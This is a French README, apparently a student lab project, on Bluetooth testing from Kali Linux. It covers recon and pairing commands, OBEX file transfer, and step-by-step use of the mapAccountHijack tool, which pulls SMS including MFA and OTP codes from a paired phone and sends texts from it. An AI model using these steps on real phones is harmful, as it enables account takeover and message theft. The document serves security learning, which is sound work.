# 🔵 Bluetooth Hacking – Commandes & Tests

> ⚠️ **Avertissement légal**  
> Ce projet est **strictement éducatif**. Toutes les commandes présentées doivent être utilisées **uniquement sur vos propres appareils** ou avec **l’autorisation explicite du propriétaire**.  
> Toute utilisation illégale est interdite.

---

## 🐉 Environnement de travail

Ce projet a été réalisé sur un **PC sous Kali Linux**, une distribution spécialisée dans les **tests d’intrusion** et l’**audit de sécurité**.  
Les outils utilisés (`hcitool`, `hciconfig`, `bluetoothctl`, `obexftp`, etc.) sont **nativement disponibles** ou facilement installables sur Kali.

Toutes les manipulations ont été effectuées dans un **cadre pédagogique**, sur des **équipements personnels ou autorisés**, afin de comprendre le fonctionnement du Bluetooth et ses vecteurs d’attaque potentiels.

## 💾 Installation
 
```
sudo apt update
sudo apt install -y bluez-tools bluez-hcidump
sudo apt install obexftp
sudo apt install gnome-bluetooth-sendto
```

## 📡 Informations sur son Bluetooth

Voir l'interface de son bluetooth : 
```hcitool dev```

Voir la configuration de son interface bluetooth : 
`hciconfig hci0`

Activer son interface bluetooth : 
```sudo hciconfig hci0 up```  

Désactiver son interface bluetooth : `sudo hciconfig hci0 down`

Autoriser la découverte : `sudo hciconfig hci0 piscan`

Désactiver la découverte : `sudo hciconfig hci0 noscan`

## 🔍 Reconnaissance Bluetooth

Scanner les périphériques avec le bluetooth delivrable : `hcitool scan`

Ping pour voir la dispo du périphérique : `sudo l2ping <MAC_bluetooth>`

Voir le nom d'un périphérique bluetooth : `hcitool name <MAC_bluetooth>`

Avoir les infos sur le périphérique bluetooth : `sudo hcitool info <MAC_bluetooth>`

## 🛠️ Utilisation de `bluetoothctl`

`bluetoothctl` est un **outil en ligne de commande** fourni par **BlueZ**, la pile Bluetooth de Linux.  
Il permet de **gérer entièrement le Bluetooth** : scan des périphériques, appairage, connexion, suppression de périphériques et gestion de l’adaptateur.

C’est l’outil **le plus moderne et le plus fiable** sous Linux. 

### Liste de quelques commandes `bluetoothctl`

Lancer bluetoothctl : `bluetoothctl`

Montrer l'état de l'adaptateur : `show` 

Choisir le mode découvrable : `discoverable <on/off>`

Activer ou désactiver le scan : `scan <on/off>`

Voir la liste des appareils disponibles : `devices`

Activer ou désactiver l'agent : `agent <on/off>`

Mettre l'agent comme par défaut : `default-agent`

Choisir le mode appairable du controleur : `pairable <on/off>`

Appareiller avec l'appareil : `pair <MAC_bluetooth>` 

Se connecter à l'appareil : `connect <MAC_bluetooth>`

Se déconnecter à l'appareil : `disconnect <MAC_bluetooth>`

Supprimer l'appareil : `remove <MAC_bluetooth>`

Avec ***<MAC_bluetooth>*** qui correspond à l'adresse MAC bluetooth de l'appareil distant

### `bluetoothctl` avec 2 PCs

Ces tests ont été effectués entre des PCs sous Linux (Debian 13 et Kali linux). On a d'abord connecté les 2 PCs ensemble puis nous avons transféré un fichier via le bluetooth.

Voici la liste des commandes exécutées pour connecter les PCs : 

```
1. bluetoothctl
2. agent on 
3. default-agent
4. discoverable on
5. pairable on
6. scan on
7. pair <MAC_bluetooth>
```
Un message **Confirm passkey** va s'afficher sur l'écran et il faudra répondre `yes`

Un fois la connexion faite, nous avons pu transférer un fichier via `obexftp`

`obexftp --nopath --noconn --uuid none --bluetooth <MAC_bluetooth> --channel 9 --put <chemin/vers/fichier>`

On devrait avoir un résultat comme celui-ci : 

*Suppressing FBS.  
Connecting..\done  
Sending "hacker.jpeg"...\done  
Disconnecting..|done*

hacker.jpeg est le fichier envoyé.

### `bluetoothctl` 1 PC et un téléphone

Ce test a été fait entre 1 PC sous Kali Linux et un Samsung Galaxy S10. On a d'abord connecté les 2 appareils ensemble puis nous avons transféré un fichier via le bluetooth. 
Voici la liste des commandes exécutées :

```
bluetoothctl
discoverable on
agent on 
default-agent
pair <MAC_bluetooth>
```
Un message **Confirm passkey** va s'afficher sur l'écran et il faudra répondre `yes`

Un fois la connexion faite, nous avons pu transférer un fichier via `obexftp`

```
obexftp --nopath --noconn --uuid none --bluetooth <MAC_bluetooth> --channel 12 --put <chemin/vers/fichier>
```

Il est possible qu'un message sur le téléphone apparaisse pour accepter le transfert de fichier.

Au final, on devrait avoir le même résulat que pour les PCs.

### Envoi d'un fichier avec `bluetooth-sendto`

Il existe une alternative à obexftp pour l'envoi de fichier. Ici je l'ai testé sur le téléphone Samsung. Je me suis d'abord connecté au téléphone avec les commandes :  

```
1. bluetoothctl
2. agent on
3. discoverable on
4. pairable on
5. scan on
6. pair <MAC_bluetooth>
7. connect <MAC_bluetooth>
```
Un message **Confirm passkey** va s'afficher sur l'écran et il faudra répondre `yes`

Ensuite, j'ai pu envoyé le fichier vers le téléphone : 

```
bluetooth-sendto --device=<MAC_bluetooth> <chemin/vers/fichier>
```

Sur le téléphone, on accepte le transfert et un message disant que le transfert a réussi apparait.


## 🕵️ Utilisation de l'outil mapAccountHijack

mapAccountHijack est un outil conçu pour réaliser une attaque appelée MAP Account Hijack.
Cette attaque exploite le profil Bluetooth MAP (Message Access Profile) sur les appareils utilisant le Bluetooth Classic.

L’objectif est de intercepter des SMS, notamment :

des codes MFA (authentification multi‑facteurs)

des OTP (codes à usage unique)

Grâce à cela, un attaquant peut prendre le contrôle de comptes qui utilisent des codes envoyés par SMS lors de la connexion ou de la récupération de compte.

L’outil fonctionne sur les dernières versions d’Android et d’iOS.

### 📱 Versions et appareils vulnérables

Appareils Android vulnérables à une attaque MAP d’account takeover en 2 clics  
**Samsung S23 (Android 14, OneUI 6.1)** : permet l’envoi d’un SMS  
**iOS 17.6.1** vulnérable à une attaque MAP d’account takeover en 1 clic (sous certaines conditions)  
**iOS 17.6.1** : permet l’envoi d’un SMS

### 🧪 Installation de l'outil

Pour voir les installations à faire on peut aller directement sur le github https://github.com/sgxgsx/mapAccountHijack.git.

Cependant, j'ai rencontré des problèmes donc je vais mettre ici les commande que j'ai exécuté pour installer mapAccountHijack.

```
sudo apt-get install python3-venv
git clone https://github.com/sgxgsx/mapAccountHijack.git
cd mapAccountHijack
python3 -m venv venv
source venv/bin/activate


chmod +x install.sh
sudo ./install.sh
```

On fait la commande pour changer la ligne dans /usr/lib/systemd/system/bluetooth.service

La commande :  
`sudo nano /usr/lib/systemd/system/bluetooth.service`

De base :  
`ExecStart=/usr/libexec/bluetooth/bluetoothd`

On remplace par :  
`ExecStart=/usr/libexec/bluetooth/bluetoothd --compat`

Puis on tape : 
```
sudo service bluetooth stop
sudo systemctl daemon-reload
sudo service bluetooth start
sudo hciconfig -a hci0 reset

source ${tool_installation_path} venv/bin/activate
```

C'est à partir d'ici que j'ai eu des erreurs. Donc j'ai fait : 
```
chmod -R u+rw nOBEX
sudo chmod -R u+rw nOBEX
rm -rf nOBEX.egg-info
pip install ./nOBEX
sudo chown -R $USER:$USER ./nOBEX

sudo apt install python3-xyz

sudo service bluetooth stop
sudo systemctl daemon-reload
sudo service bluetooth start
sudo hciconfig -a hci0 reset

pip install aiohttp
```

On peut voir les options avec :  
`python3 mapAccountHijack.py --help`

On peut récupérer les messages d'un téléphone avec la commande :
`python3 mapAccountHijack.py --address <MAC_bluetooth> --dest-dir ./out`

On peut à la fois récupérer les messages et envoyer un SMS avec le téléphone piraté : 
`python3 mapAccountHijack.py --address <MAC_bluetooth> --dest-dir ./out --phone-number <Num_Tel>`

On peut changer le message envoyé par le téléphone piraté en modifiant le fichier constants.py. On a cette fonction de base : 
```
def get_SMS_MESSAGE_END():
    return b"\r\nEND:VCARD\r\n"  + b"BEGIN:BBODY\r\nCHARSET:UTF-8\r\nENCODING:8bit\r\nLENGTH:40\r\nBEGIN:MSG\r\nThis is a new msg!\r\nEND:MSG\r\n" + b"END:BBODY\r\nEND:BENV\r\nEND:BMSG\r\n"
    
```

Et on peut remplacer le message par "Un message de test pour GIT!" : 
```
def get_SMS_MESSAGE_END():
    return b"\r\nEND:VCARD\r\n"  + b"BEGIN:BBODY\r\nCHARSET:UTF-8\r\nENCODING:8bit\r\nLENGTH:40\r\nBEGIN:MSG\r\nUn message de test pour GIT!\r\nEND:MSG\r\n" + b"END:BBODY\r\nEND:BENV\r\nEND:BMSG\r\n"
```

On se connecte au téléphone : 
```
agent on
default-agent
pair <MAC_bluetooth>
trust <MAC_bluetooth>
connect <MAC_bluetooth>
```

Ensuite, on lance donc la commande avec comme option notre numéro de téléphone.  
Sur le téléphone piraté on peut voir qu'il envoie un message : 

![msg_target_phone](https://github.com/user-attachments/assets/1419ac06-3cb3-42e0-9b35-1525841cb32c)


Et sur le téléphone du hacker : 
